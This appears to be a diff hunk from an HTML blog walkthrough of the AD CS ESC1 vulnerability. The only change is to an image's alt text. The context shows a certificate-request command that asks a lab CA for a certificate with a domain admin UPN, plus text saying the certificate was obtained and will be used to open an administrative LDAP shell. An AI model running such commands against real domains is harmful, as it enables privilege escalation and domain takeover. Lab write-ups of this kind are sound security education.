@@ -188,7 +188,7 @@ what is esc1? esc1 is a specific vulnerability targeting overly permissive activ
 <blockquote>
 <p>python3 entry.py req -u <a href="mailto:joshua@cxlabs.local">joshua@cxlabs.local</a> -p REDACTED -target 192.168.197.129 -template VulnTemplate -ca &ldquo;CXLABS-CXLABS-DC-01-CA&rdquo; -upn &ldquo;<a href="mailto:domain_admin@cxlabs.local">domain_admin@cxlabs.local</a>&rdquo;</p>
 </blockquote>
-<p><img src="/poc.png" alt="POC"></p>
+<p><img src="/poc.png" alt="poc"></p>
 <p>as you can see we have successfully managed to receive a .PFX certificate that allows us to impersonate a domain admin.</p>
 <p>we can now use this to open up an administrative LDAP shell using the below payload:</p>
 <blockquote>
